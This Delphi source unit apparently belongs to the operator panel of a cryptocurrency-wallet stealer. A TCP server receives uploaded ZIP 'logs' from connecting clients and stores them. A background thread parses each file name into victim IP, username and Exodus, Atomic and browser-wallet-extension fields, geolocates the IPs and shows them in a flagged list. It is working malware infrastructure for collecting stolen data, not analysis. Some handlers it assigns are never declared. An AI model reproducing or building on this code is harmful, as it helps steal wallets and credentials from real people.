unit Unit2;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, scControls, scGPControls, Vcl.ExtCtrls,
  Vcl.BaseImageCollection, Vcl.ImageCollection, System.ImageList, Vcl.ImgList,
  Vcl.VirtualImageList, Vcl.Imaging.pngimage, scStyledForm, scGPExtControls,
  scGPPagers, scGPImages, Vcl.StdCtrls, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTCPServer, Vcl.ComCtrls, System.Generics.Collections,
  IdHTTP, IdTCPConnection, IdTCPClient, IdURI,
  IdSSLOpenSSL, IdSSL, System.JSON, System.IOUtils, System.UITypes, Math, IdContext, IdGlobal,
  Vcl.Menus,Winapi.CommCtrl;

      type
  _MARGINS = record
    cxLeftWidth: Integer;
    cxRightWidth: Integer;
    cyTopHeight: Integer;
    cyBottomHeight: Integer;
  end;





type
  TFileInfo = record
    FileName: string;
    IP: string;
    Username: string;
    Exodus: string;
    Atomic: string;
    WalletExt: string;
    FileSize: Int64;
    CountryCode: string;
  end;

  TCountryInfo = record
    CountryCode: string;
    FlagIndex: Integer;
  end;

  TFileMonitorThread = class(TThread)
  private
    FLogFolder: string;
    FListView: TListView;
    FFileList: TList<TFileInfo>;
    FCountryCache: TDictionary<string, TCountryInfo>;
    FLastScanTime: TDateTime;

    procedure UpdateListView;
    function GetFlagIndex(const CountryCode: string): Integer;
    function GetCountryFromIP(const IP: string): TCountryInfo;
    function ParseFileName(const FileName: string): TFileInfo;
  protected
    procedure Execute; override;
  public
    constructor Create(AListView: TListView; const ALogFolder: string);
    destructor Destroy; override;
  end;
     const
  LVM_GETHEADER = $1000 + 31;
  HDS_OWNERDRAWNFIXED = $0100;
  HDM_GETITEM = $1200 + 11;


type
  TForm2 = class(TForm)
    scGPPanel1: TscGPPanel;
    scGPButton1: TscGPButton;
    VirtualImageList1: TVirtualImageList;
    ImageCollection1: TImageCollection;
    scGPButton2: TscGPButton;
    scGPButton3: TscGPButton;
    scGPButton4: TscGPButton;
    Image1: TImage;
    scGPPanel2: TscGPPanel;
    scGPButton5: TscGPButton;
    scGPButton6: TscGPButton;
    scGPPageControl1: TscGPPageControl;
    Connections: TscGPPageControlPage;
    Dashboard: TscGPPageControlPage;
    AutoTasks: TscGPPageControlPage;
    LocalSettings: TscGPPageControlPage;
    Settings: TscGPPageControlPage;
    AboutOcta: TscGPPageControlPage;
    scGPPanel3: TscGPPanel;
    scGPPanel4: TscGPPanel;
    scGPPanel5: TscGPPanel;
    scGPButton7: TscGPButton;
    scGPButton8: TscGPButton;
    scGPImage1: TscGPImage;
    Label1: TLabel;
    scGPImage2: TscGPImage;
    Label2: TLabel;
    scGPImage3: TscGPImage;

    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    scGPPanel6: TscGPPanel;
    scGPPanel7: TscGPPanel;
    Label8: TLabel;
    Label9: TLabel;
    scGPPanel8: TscGPPanel;
    Label10: TLabel;
    scGPImage4: TscGPImage;
    scGPPanel9: TscGPPanel;
    StatusBar1: TStatusBar;
    IdTCPServer1: TIdTCPServer;
    ImageList1: TImageList;
    ListView1: TListView;
    procedure FormCreate(Sender: TObject);
    procedure IdTCPServer1Execute(AContext: TIdContext);
    procedure IdTCPServer1Connect(AContext: TIdContext);
    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);


  private
    { Private declarations }
        FMonitorThread: TFileMonitorThread;
     ListViewWindow: HWND;
    procedure StartMonitoring;
   procedure SetupListView;
  public
  procedure WMNCHitTest(var Msg: TWMNCHitTest); message WM_NCHITTEST;

  end;

var
  Form2: TForm2;

implementation

{$R *.dfm}
uses
  Winapi.Dwmapi,  Winapi.UxTheme;




procedure TForm2.FormCreate(Sender: TObject);
var
  Shadow: Integer;
  Margins: Winapi.UxTheme._MARGINS;  // Use the correct type from UxTheme
const
  DWMWCP_ROUND = 2;
  DWMWA_WINDOW_CORNER_PREFERENCE = 33;
begin


   
 

SetupListView;
    StartMonitoring;

   BorderStyle := bsNone;

  // Enable shadow
  Shadow := 1;
  DwmSetWindowAttribute(Handle, DWMWA_NCRENDERING_POLICY, @Shadow, SizeOf(Shadow));

  // Set up margins for shadow
  Margins.cxLeftWidth := 2;
  Margins.cxRightWidth := 2;
  Margins.cyTopHeight := 2;
  Margins.cyBottomHeight := 2;
  DwmExtendFrameIntoClientArea(Handle, Margins);

  // Make form background proper for shadow
  SetWindowLong(Handle, GWL_EXSTYLE,
    GetWindowLong(Handle, GWL_EXSTYLE) or WS_EX_LAYERED);
 // SetLayeredWindowAttributes(Handle, 0, 255, LWA_ALPHA);

  ListView1.OwnerDraw := True;


end;

procedure TForm2.SetupListView;
var
  Header: HWND;
  HeaderStyle: NativeInt;
begin
  // First set up the basic ListView properties
  ListView1.ViewStyle := vsReport;

  // Set up the columns if needed (you may already have this in your form designer)
  if ListView1.Columns.Count = 0 then
  begin
    ListView1.Columns.Add.Caption := 'Flag';
    ListView1.Columns.Add.Caption := 'IP';
    ListView1.Columns.Add.Caption := 'Username';
    ListView1.Columns.Add.Caption := 'Exodus';
    ListView1.Columns.Add.Caption := 'Atomic';
    ListView1.Columns.Add.Caption := 'Wallet Extension';
    ListView1.Columns.Add.Caption := 'File Size';
  end;

  // Enable owner drawing
  ListView1.OwnerDraw := True;

  // Essential: make the header owner-drawn
  Header := SendMessage(ListView1.Handle, LVM_GETHEADER, 0, 0);
  if Header <> 0 then
  begin
    HeaderStyle := GetWindowLong(Header, GWL_STYLE);
    SetWindowLong(Header, GWL_STYLE, HeaderStyle or HDS_OWNERDRAWNFIXED);
  end;

  // Add owner-draw events for header and items
  ListView1.OnAdvancedCustomDrawItem := ListView1AdvancedCustomDrawItem;
  ListView1.OnAdvancedCustomDrawSubItem := ListView1AdvancedCustomDrawSubItem;
  ListView1.OnDrawColumnHeader := ListView1DrawColumnHeader;
end;

// Country code to flag index mapping
function GetDefaultCountryMapping: TDictionary<string, Integer>;
var
  CountryMap: TDictionary<string, Integer>;
begin
  CountryMap := TDictionary<string, Integer>.Create;

  // Map country codes to flag indices
  CountryMap.Add('AU', 0);  // Australia
  CountryMap.Add('AT', 1);  // Austria
  CountryMap.Add('CA', 2);  // Canada
  CountryMap.Add('CN', 3);  // China
  CountryMap.Add('CZ', 4);  // Czech Republic
  CountryMap.Add('FI', 5);  // Finland
  CountryMap.Add('FR', 6);  // France
  CountryMap.Add('DE', 7);  // Germany
  CountryMap.Add('GB', 8);  // United Kingdom
  CountryMap.Add('HK', 9);  // Hong Kong
  CountryMap.Add('HU', 10); // Hungary
  CountryMap.Add('IT', 11); // Italy
  CountryMap.Add('LU', 12); // Luxembourg
  CountryMap.Add('MX', 13); // Mexico
  CountryMap.Add('NG', 14); // Nigeria
  CountryMap.Add('PL', 15); // Poland
  CountryMap.Add('RO', 16); // Romania
  CountryMap.Add('RU', 17); // Russia
  CountryMap.Add('ES', 18); // Spain
  CountryMap.Add('CH', 20); // Switzerland
  CountryMap.Add('TR', 21); // Turkey
  CountryMap.Add('US', 22); // USA

  Result := CountryMap;
end;

{ TFileMonitorThread }

constructor TFileMonitorThread.Create(AListView: TListView; const ALogFolder: string);
begin
  inherited Create(True);
  FreeOnTerminate := True;

  FListView := AListView;
  FLogFolder := ALogFolder;
  FFileList := TList<TFileInfo>.Create;
  FCountryCache := TDictionary<string, TCountryInfo>.Create;
  FLastScanTime := 0;
end;

destructor TFileMonitorThread.Destroy;
begin
  FFileList.Free;
  FCountryCache.Free;
  inherited;
end;
procedure TFileMonitorThread.Execute;
var
  FileList: TStringList;
  I: Integer;
  FileName: string;
  FileInfo: TFileInfo;
  NeedUpdate: Boolean;
  SR: TSearchRec;
  FileSizes: TDictionary<string, Int64>;
  MaxFilesToProcess: Integer;
  BatchSize: Integer;
  StartIndex: Integer;
  ProcessedCount: Integer;
begin
  while not Terminated do
  begin
    try
      // Check if "Logs" folder exists
      if DirectoryExists(FLogFolder) then
      begin
        NeedUpdate := False;
        FileSizes := TDictionary<string, Int64>.Create;

        // Get all ZIP files using FindFirst/FindNext (XE7 compatible)
        FileList := TStringList.Create;
        try
          if FindFirst(FLogFolder + '\*.zip', faAnyFile, SR) = 0 then
          begin
            repeat
              FileList.Add(SR.Name);
              FileSizes.Add(SR.Name, SR.Size);  // Store filename and size
            until FindNext(SR) <> 0;
            FindClose(SR);
          end;

          // If number of files changed or it's been more than 30 seconds
          if (FFileList.Count <> FileList.Count) or
             (Now - FLastScanTime > (30 / 86400)) then // 30 seconds in days
          begin
            // Set up for batch processing
            BatchSize := 20; // Process 20 files at a time
            MaxFilesToProcess := FileList.Count;
            StartIndex := 0;
            ProcessedCount := 0;

            // Clear the list only once
            FFileList.Clear;

            // Resize list to avoid multiple reallocations
            FFileList.Capacity := MaxFilesToProcess;

            while (StartIndex < MaxFilesToProcess) and not Terminated do
            begin
              // Process a batch of files
              for I := StartIndex to Min(StartIndex + BatchSize - 1, MaxFilesToProcess - 1) do
              begin
                FileName := FileList[I];
                FileInfo := ParseFileName(FileName);

                // Get file size from our dictionary
                if FileSizes.ContainsKey(FileName) then
                  FileInfo.FileSize := FileSizes[FileName]
                else
                  FileInfo.FileSize := 0;  // Fallback if size not found

                // Only query country info for new IPs
                if not FCountryCache.ContainsKey(FileInfo.IP) then
                  FCountryCache.Add(FileInfo.IP, GetCountryFromIP(FileInfo.IP));

                FFileList.Add(FileInfo);
                Inc(ProcessedCount);
              end;

              // Update UI after each batch
              if ProcessedCount > 0 then
              begin
                NeedUpdate := True;
                Synchronize(UpdateListView);

                // Update status to show progress
                Synchronize(
                  procedure
                  begin
                    Form2.StatusBar1.Panels[0].Text := 'Loading: ' + IntToStr(ProcessedCount) +
                                                     ' of ' + IntToStr(MaxFilesToProcess);
                  end
                );
              end;

              // Move to next batch
              StartIndex := StartIndex + BatchSize;

              // Brief pause to let UI refresh and be responsive
              Sleep(10);
            end;

            FLastScanTime := Now;

            // Final update with complete count
            if NeedUpdate then
              Synchronize(
                procedure
                begin
                  Form2.StatusBar1.Panels[0].Text := 'Total Logs: ' + IntToStr(FFileList.Count);
                end
              );
          end;
        finally
          FileList.Free;
          FileSizes.Free;
        end;
      end;

      // Wait 2 seconds before checking again
      Sleep(2000);
    except
      on E: Exception do
      begin
        // Log the error
        Synchronize(
          procedure
          begin
          //  Form2.ErrorLogs.Lines.Add('Error in monitor thread: ' + E.Message);
          end
        );
        Sleep(5000); // Longer delay after error
      end;
    end;
  end;
end;

function TFileMonitorThread.GetCountryFromIP(const IP: string): TCountryInfo;
var
  HTTP: TIdHTTP;
  JSONValue: TJSONValue;
  CountryCode: string;
  ResponseStr: string;
  SSLHandler: TIdSSLIOHandlerSocketOpenSSL;
begin
  Result.CountryCode := 'XX'; // Default unknown
  Result.FlagIndex := 23;     // Custom flag for unknown countries

  // Skip IP lookup for local IPs
  if (IP = '127.0.0.1') or (IP = 'localhost') or
     (Pos('192.168.', IP) = 1) or (Pos('10.', IP) = 1) then
    Exit;

  HTTP := TIdHTTP.Create(nil);
  SSLHandler := TIdSSLIOHandlerSocketOpenSSL.Create(HTTP);
  try
    HTTP.IOHandler := SSLHandler;
    SSLHandler.SSLOptions.SSLVersions := [sslvTLSv1, sslvTLSv1_1, sslvTLSv1_2];

    HTTP.ConnectTimeout := 2000; // Reduced timeout
    HTTP.ReadTimeout := 2000;    // Reduced timeout

    try
      ResponseStr := HTTP.Get('http://ip-api.com/json/' + IP + '?fields=countryCode');

      JSONValue := TJSONObject.ParseJSONValue(ResponseStr);
      try
        if Assigned(JSONValue) and (JSONValue is TJSONObject) then
        begin
          CountryCode := TJSONObject(JSONValue).GetValue<string>('countryCode');
          Result.CountryCode := CountryCode;
          Result.FlagIndex := GetFlagIndex(CountryCode);
        end;
      finally
        JSONValue.Free;
      end;
    except
      // Just return default values on any error
    end;
  finally
    SSLHandler.Free;
    HTTP.Free;
  end;
end;

function TFileMonitorThread.GetFlagIndex(const CountryCode: string): Integer;
var
  CountryMap: TDictionary<string, Integer>;
  FlagIndex: Integer;
begin
  CountryMap := GetDefaultCountryMapping;
  try
    if CountryMap.TryGetValue(CountryCode, FlagIndex) then
      Result := FlagIndex
    else
      Result := 23; // Custom flag for countries not in the list
  finally
    CountryMap.Free;
  end;
end;

function TFileMonitorThread.ParseFileName(const FileName: string): TFileInfo;
var
  Parts: TArray<string>;
  CleanName: string;
  I, Count: Integer;
  CurrentPart: string;
  Separator: string;
begin
  // Remove .zip extension
  CleanName := StringReplace(FileName, '.zip', '', [rfIgnoreCase]);

  // XE7 compatible split
  Separator := '-';
  Count := 0;
  SetLength(Parts, 5); // Pre-allocate for 5 parts

  I := 1;
  while I <= Length(CleanName) do
  begin
    CurrentPart := '';
    while (I <= Length(CleanName)) and (CleanName[I] <> Separator) do
    begin
      CurrentPart := CurrentPart + CleanName[I];
      Inc(I);
    end;

    if Count < Length(Parts) then
      Parts[Count] := CurrentPart;

    Inc(Count);
    Inc(I); // Skip the separator
  end;

  Result.FileName := FileName;

  // Parse parts
  if Length(Parts) >= 1 then
    Result.IP := Parts[0];

  if Length(Parts) >= 2 then
    Result.Username := Parts[1];

  if Length(Parts) >= 3 then
    Result.Exodus := Parts[2];

  if Length(Parts) >= 4 then
    Result.Atomic := Parts[3];

  if Length(Parts) >= 5 then
    Result.WalletExt := Parts[4];
end;

procedure TFileMonitorThread.UpdateListView;
var
  I: Integer;
  Item: TListItem;
  FileInfo: TFileInfo;
  CountryInfo: TCountryInfo;
begin
  // Clear the list
  FListView.Items.BeginUpdate;
  try
    FListView.Items.Clear;

    for I := 0 to FFileList.Count - 1 do
    begin
      FileInfo := FFileList[I];
      Item := FListView.Items.Add;

      // Get country info from cache
      if FCountryCache.TryGetValue(FileInfo.IP, CountryInfo) then
        Item.ImageIndex := CountryInfo.FlagIndex
      else
        Item.ImageIndex := 23; // Default flag

      // Set other columns
      Item.SubItems.Add(FileInfo.IP);
      Item.SubItems.Add(FileInfo.Username);
      Item.SubItems.Add(FileInfo.Exodus);
      Item.SubItems.Add(FileInfo.Atomic);
      Item.SubItems.Add(FileInfo.WalletExt);
      Item.SubItems.Add(FormatFloat('#,##0', FileInfo.FileSize));
    end;
  finally
    FListView.Items.EndUpdate;
     // At the end of your UpdateListView method
       Form2.StatusBar1.Panels[0].Text := 'Total Logs: '  + IntToStr(FListView.Items.Count);;

  end;
end;
procedure TForm2.IdTCPServer1Connect(AContext: TIdContext);
begin
 TThread.Queue(nil,
    procedure
    begin
      StatusBar1.Panels[3].Text := 'Client connected: ' + AContext.Connection.Socket.Binding.PeerIP;
    end
  );
end;

procedure TForm2.IdTCPServer1Execute(AContext: TIdContext);
var
  ReceivedData: string;
  Command: Char;
  FileName: string;
  FileSize: Int64;
  LogsFolder: string;
  FileStream: TFileStream;
  Buffer: TIdBytes; // Changed from TBytes to TIdBytes
  BytesRead: Integer;
  TotalBytesRead: Int64;
  StatusMsg: string; // For storing formatted messages
begin
    try
    // Read data from the client
    ReceivedData := AContext.Connection.IOHandler.ReadLn();

    // Check if data is long enough to extract command
    if Length(ReceivedData) > 0 then
    begin
      // First character is the command
      Command := ReceivedData[1];
      // Remove the command from the data
      Delete(ReceivedData, 1, 1);
      // Trim any whitespace or newline characters
      ReceivedData := Trim(ReceivedData);

      // Regular message command
      if Command = 'H' then
      begin
        TThread.Queue(nil,
          procedure
          begin
            StatusBar1.Panels[2].Text := 'Message: ' + ReceivedData;
          end
        );
      end
      // ZIP file transfer command
      else if Command = 'Z' then
      begin
        // The data contains the filename of the ZIP
        FileName := ReceivedData;

        // Read the file size
        FileSize := StrToInt64(AContext.Connection.IOHandler.ReadLn());

        // Create Logs folder if it doesn't exist
        LogsFolder := ExtractFilePath(Application.ExeName) + 'Logs';
        if not DirectoryExists(LogsFolder) then
          CreateDir(LogsFolder);

        // Create a file stream to save the ZIP
        FileStream := TFileStream.Create(LogsFolder + '\' + FileName, fmCreate);
        try
          // Initialize buffer and counters
          SetLength(Buffer, 8192); // 8KB buffer
          TotalBytesRead := 0;

          while TotalBytesRead < FileSize do
          begin
            // Determine how many bytes to read next
            BytesRead := Integer(Min(Length(Buffer), FileSize - TotalBytesRead));

            // Read bytes from network into buffer
            AContext.Connection.IOHandler.ReadBytes(Buffer, BytesRead);

            // Write buffer to file
            FileStream.WriteBuffer(Buffer[0], BytesRead);

            // Update total bytes read
            TotalBytesRead := TotalBytesRead + BytesRead;

            // Create status message outside of anonymous method
            StatusMsg := 'Receiving file: ' + FileName + ' (' +
                        IntToStr(TotalBytesRead) + '/' + IntToStr(FileSize) + ' bytes)';

            // Update UI with progress
            TThread.Queue(nil,
              procedure
              begin
                StatusBar1.Panels[2].Text := StatusMsg;
              end
            );
          end;

          // File transfer complete - create message outside anonymous method
          StatusMsg := 'File received: ' + FileName;

          TThread.Queue(nil,
            procedure
            begin
              StatusBar1.Panels[2].Text := StatusMsg;
            end
          );
        finally
          FileStream.Free;
        end;
      end;
    end;
  except
    on E: Exception do
    begin
      // Store the error message before passing to anonymous method
      StatusMsg := 'Error: ' + E.Message;

      TThread.Queue(nil,
        procedure
        begin
          StatusBar1.Panels[2].Text := StatusMsg;
        end
      );
    end;
  end;
end;




procedure TForm2.ListView1CustomDrawSubItem(Sender: TCustomListView;
  Item: TListItem; SubItem: Integer; State: TCustomDrawState;
  var DefaultDraw: Boolean);
  var
  Canvas: TCanvas;
  SubItemRect: TRect;
begin
     Canvas := (Sender as TListView).Canvas;

  // Different color for different columns
  case SubItem of
    0: Canvas.Brush.Color := $E0FFE0; // Light green for first column
    1: Canvas.Brush.Color := $FFE0E0; // Light red for second column
    else Canvas.Brush.Color := $E0E0FF; // Light purple for other columns
  end;

  // Use different text colors if needed
  if SubItem = 1 then
    Canvas.Font.Color := clBlue;

  DefaultDraw := True;
end;

procedure TForm2.StartMonitoring;
var
  LogsFolder: string;
begin
  // Get the logs folder path (current directory + 'Logs')
  LogsFolder := IncludeTrailingPathDelimiter(ExtractFilePath(Application.ExeName)) + 'Logs';

  // Create the directory if it doesn't exist
  if not DirectoryExists(LogsFolder) then
    CreateDir(LogsFolder);

  // Create and start the monitor thread
  FMonitorThread := TFileMonitorThread.Create(ListView1, LogsFolder);
  FMonitorThread.Start;
end;

procedure TForm2.WMNCHitTest(var Msg: TWMNCHitTest);
begin
  inherited;
  if Msg.Result = HTCLIENT then
    Msg.Result := HTCAPTION;
end;

end.
